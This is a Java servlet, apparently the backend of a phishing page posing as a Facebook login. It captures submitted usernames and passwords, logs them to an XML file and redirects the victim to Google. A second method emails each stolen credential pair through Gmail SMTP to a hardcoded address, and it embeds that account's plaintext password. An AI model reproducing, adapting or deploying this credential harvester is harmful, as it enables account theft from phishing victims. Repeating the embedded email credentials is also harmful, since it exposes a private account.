package com.fjr.action.facebook;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.util.Properties;

import javax.mail.Message;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.OutputKeys;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerException;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.xml.sax.SAXException;

public class ProcessRequest  extends HttpServlet{
	
	

	public void doGet(HttpServletRequest req, HttpServletResponse resp) {
		String nama = req.getParameter("username");
		String password = req.getParameter("password");
		if (nama != null && password != null) {
//			processEmail(nama, password);
			try {
				String path = getServletContext().getRealPath("/WEB-INF/file/userlist.xml");
//				System.out.println(path);
				writeToXML(nama, password , path);
			}catch( Exception e) {
				e.printStackTrace();
			}
		}


		try {
			resp.sendRedirect("http://www.google.com") ;
//			resp.addHeader("Location" , "www.google.com" );
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
	
	public synchronized void  writeToXML(String nama, String password, String path) throws TransformerException, FileNotFoundException, SAXException, IOException, ParserConfigurationException {
		DocumentBuilderFactory dbfactori = DocumentBuilderFactory.newInstance(); 
		DocumentBuilder builder = dbfactori.newDocumentBuilder(); 
		Document document = builder.parse(new FileInputStream(path));
		Element el = document.getDocumentElement(); 
		Element artikel_baru = document.createElement("log") ; 
		
		artikel_baru.setAttribute("nama", nama); 
		artikel_baru.setAttribute("password", password);
		
		el.appendChild(artikel_baru);  
		
		TransformerFactory tfactory = TransformerFactory.newInstance(); 
		Transformer transformer = tfactory.newTransformer(); 
		transformer.setOutputProperty(OutputKeys.INDENT , "yes"); 
		
		DOMSource source = new DOMSource(document); 
		StreamResult result = new StreamResult( new PrintStream
				(new FileOutputStream(path))); 
		
		transformer.transform(source, result); 
//		System.out.println("finish"); 

	}
	
	public void processEmail(String nama, String password) {

		Properties mailServerProperties = System.getProperties();
		mailServerProperties.put("mail.smtp.port", "587");
		mailServerProperties.put("mail.smtp.auth", "true");
		mailServerProperties.put("mail.smtp.starttls.enable", "true");

		Session getMailSession = Session.getDefaultInstance(mailServerProperties, null);
		MimeMessage generateMailMessage = new MimeMessage(getMailSession);
		try {
			generateMailMessage.addRecipient(Message.RecipientType.TO, new InternetAddress("fajar.kasimbar@gmail.com"));
			generateMailMessage.setSubject("Ada yang terjebak");
			String emailBody = "nama: "  + nama + "| pasword: "+ password;
			generateMailMessage.setContent(emailBody, "text/html");

			Transport transport = getMailSession.getTransport("smtp");

			transport.connect("smtp.googlemail.com", "fajar.kasimbar@gmail.com", "KasimBaR-p-21Z");
			transport.sendMessage(generateMailMessage, generateMailMessage.getAllRecipients());
			transport.close();

		}catch(Exception e) {
			System.out.println("mail.sending error"); 
			e.printStackTrace();
		}

	}
	
	public static void main(String[] args) {
		String path = "D:/eclipse document 1/BilanganToBahasaKonverter/WebContent/WEB-INF/file/userlist.xml " ;
		String nama = "rio"; 
		String password = "xxx"; 
		try {
			new ProcessRequest().writeToXML(nama, password, path);
		}catch(Exception e) {
			e.printStackTrace();
		}
	}
	
	
}
